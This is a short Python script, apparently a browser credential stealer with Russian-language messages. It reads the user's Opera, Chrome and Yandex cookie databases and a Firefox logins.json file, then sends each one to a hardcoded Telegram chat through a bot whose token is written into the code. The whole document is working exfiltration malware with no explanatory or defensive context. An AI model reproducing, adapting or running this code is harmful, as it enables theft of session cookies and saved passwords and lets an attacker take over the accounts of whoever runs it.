import os
import telebot

chat_id = "1209373505"

token = "5217335080:AAGjl7zeP_1Uep6c9HGhECSF1dVygzv9wiM"
client = telebot.TeleBot(token)
user = os.getlogin()
link_opera = fr"C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable\Cookies"
chrome_link = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Cookies"
mosila_link = fr"C:\Users\{user}\AppData\Roaming\Mozilla\Firefox\Profiles\xlqdxexz.default-1636997702428\logins.json"
yandex_link = fr"C:\Users\{user}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies"


client.send_message(chat_id, "начало")
try:

    client.send_document(chat_id=chat_id, document=open(link_opera, "rb").read(), caption="Cookies \nопера ")

except FileNotFoundError:
    print("оперы нет")

try:

    client.send_document(chat_id=chat_id, document=open(chrome_link, "rb").read(), caption="Cookies \nхром")

except FileNotFoundError:
    print("хрома нет")

try:

    client.send_document(chat_id=chat_id, document=open(mosila_link, "rb").read(), caption="logins.json\nфаер фокс")

except FileNotFoundError:
    print("мозилы нет")

try:

    client.send_document(chat_id=chat_id, document=open(yandex_link, "rb").read(), caption="Cookies \nяндекс")

except FileNotFoundError:
    print("яндекса нет")

client.send_message(chat_id, "конец")
